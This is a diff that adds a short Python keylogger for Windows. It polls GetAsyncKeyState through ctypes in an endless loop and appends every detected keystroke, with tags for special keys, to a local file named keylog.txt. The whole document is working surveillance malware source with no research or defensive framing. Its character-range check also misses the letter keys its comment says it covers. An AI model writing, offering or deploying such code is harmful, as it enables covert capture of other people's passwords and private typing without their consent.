@@ -1,0 +1,46 @@
+import ctypes
+import time
+
+# Open a file to log keystrokes
+logfile = open("keylog.txt", "a")
+
+# Function to log keystrokes
+def log_keystroke(key):
+    # If the key is a standard character (A-Z, 0-9, symbols)
+    if 39 <= key <= 64:
+        logfile.write(chr(key))
+    else:
+        # Handle special keys
+        if key == 0x20:  # VK_SPACE
+            logfile.write(' ')
+        elif key == 0x10:  # VK_SHIFT
+            logfile.write('[SHIFT]')
+        elif key == 0x0D:  # VK_RETURN (Enter key)
+            logfile.write('\n')
+        elif key == 0x08:  # VK_BACK (Backspace)
+            logfile.write('[BACKSPACE]')
+        elif key == 0x09:  # VK_TAB
+            logfile.write('[TAB]')
+        elif key == 0x1B:  # VK_ESCAPE
+            logfile.write('[ESCAPE]')
+        elif key == 0x11:  # VK_CONTROL (Control key)
+            logfile.write('[CTRL]')
+    
+    logfile.flush()  # Ensure the data is immediately written to the file
+
+# Main function to capture keystrokes
+def main():
+    user32 = ctypes.windll.user32  # Load the user32.dll library
+    while True:
+        # Loop through virtual-key codes (8 to 190)
+        for key in range(8, 190):
+            # If a key is pressed, log it
+            if user32.GetAsyncKeyState(key) & 0x8000:  # Check if the key is pressed
+                log_keystroke(key)
+        time.sleep(0.01)  # Small delay to reduce CPU usage
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        logfile.close()  # Close the logfile when the program is stopped
